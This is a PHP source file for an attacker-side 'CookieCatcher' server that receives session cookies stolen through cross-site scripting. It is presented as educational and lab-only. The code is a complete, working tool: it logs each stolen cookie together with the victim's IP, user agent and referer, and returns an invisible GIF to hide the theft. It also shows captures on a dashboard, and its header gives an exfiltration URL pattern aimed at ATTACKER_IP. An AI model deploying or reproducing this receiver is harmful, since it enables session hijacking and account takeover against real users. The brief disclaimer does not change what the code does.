<?php
/**
 * COOKIECATCHER RECEIVER (Attacker side)
 * --------------------------------------
 * Educational re-implementation of a cookie-capture endpoint.
 * Run on the attacker machine to receive cookies stolen via XSS.
 *
 *   php -S 0.0.0.0:8080 cookiecatcher.php
 *
 * The XSS payload sends the victim cookie to:
 *   http://ATTACKER_IP:8080/?c=<document.cookie>
 *
 * USE ONLY in an isolated lab with explicit authorization.
 */

date_default_timezone_set('UTC');

$logFile = __DIR__ . '/captured_cookies.log';

// Grab the cookie passed in the ?c= parameter
$cookie = isset($_GET['c']) ? $_GET['c'] : null;

if ($cookie !== null && $cookie !== '') {
    $entry = [
        'time'       => date('Y-m-d H:i:s'),
        'source_ip'  => $_SERVER['REMOTE_ADDR']        ?? 'unknown',
        'user_agent' => $_SERVER['HTTP_USER_AGENT']    ?? 'unknown',
        'referer'    => $_SERVER['HTTP_REFERER']       ?? 'unknown',
        'cookie'     => urldecode($cookie),
    ];

    // Append to log file (JSON line per capture)
    file_put_contents($logFile, json_encode($entry) . "\n", FILE_APPEND | LOCK_EX);

    // Mirror to stdout so it shows in the terminal running the server
    fwrite(STDERR, "\n=== COOKIE CAPTURED ===\n");
    foreach ($entry as $k => $v) {
        fwrite(STDERR, str_pad(strtoupper($k), 12) . ": $v\n");
    }
    fwrite(STDERR, "=======================\n");

    // Return a 1x1 transparent GIF so the victim sees nothing suspicious
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
    exit;
}

// No cookie param -> show a simple dashboard of captures
header('Content-Type: text/html; charset=utf-8');
echo "<!DOCTYPE html><html><head><title>CookieCatcher Dashboard</title>";
echo "<style>body{font-family:monospace;max-width:900px;margin:30px auto}".
     "h1{color:#c0392b}.card{background:#111;color:#0f0;padding:12px;margin:8px 0;border-radius:6px;word-break:break-all}</style>";
echo "</head><body><h1>🍪 CookieCatcher — Captured Sessions</h1>";

if (is_file($logFile)) {
    $lines = array_reverse(file($logFile, FILE_IGNORE_NEW_LINES));
    echo "<p>Total captures: " . count($lines) . "</p>";
    foreach ($lines as $line) {
        $d = json_decode($line, true);
        if (!$d) { continue; }
        echo "<div class='card'>";
        echo "[" . htmlspecialchars($d['time']) . "] ";
        echo "IP " . htmlspecialchars($d['source_ip']) . "<br>";
        echo "UA: " . htmlspecialchars($d['user_agent']) . "<br>";
        echo "COOKIE: " . htmlspecialchars($d['cookie']);
        echo "</div>";
    }
} else {
    echo "<p>No cookies captured yet. Waiting for victims...</p>";
}
echo "</body></html>";
